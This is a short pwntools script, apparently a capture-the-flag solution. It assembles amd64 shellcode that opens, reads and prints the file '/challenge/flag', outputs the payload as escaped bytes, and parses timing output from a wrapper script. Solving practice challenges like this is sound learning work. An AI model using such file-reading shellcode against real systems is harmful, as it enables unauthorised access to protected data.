import os
import subprocess
from pwn import *

context.arch = 'amd64'
code = """
    mov     rax, 0x67616c662f6567
    push    rax
    mov     rax, 0x6e656c6c6168632f
    push    rax
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     rax, 0x2
    syscall

    mov     rdi, rax
    sub     rsp, 0x100
    mov     rsi, rsp
    mov     rdx, 0x100
    xor     rax, rax
    syscall

    mov     rdi, 0x1
    mov     rdx, 0x100
    mov     rax, 0x1
    syscall

    xor     rdi, rdi
    mov     rax, 0x3c
    syscall
"""
# Basic usage
machine = asm(code)
print(machine)               # raw bytes (type: bytes)
escaped = '"' + ''.join(f'\\x{b:02X}' for b in machine) + '"'
print(escaped)

os.environ["PYTHONUNBUFFERED"] = "1"
result = subprocess.run(['python3', 'wrapper.py'], 
                        env={'PYTHONUNBUFFERED': '1'},
                        capture_output=True, text=True)
time_str = result.stdout.split("Time: ")[1].strip()
time_val = float(time_str)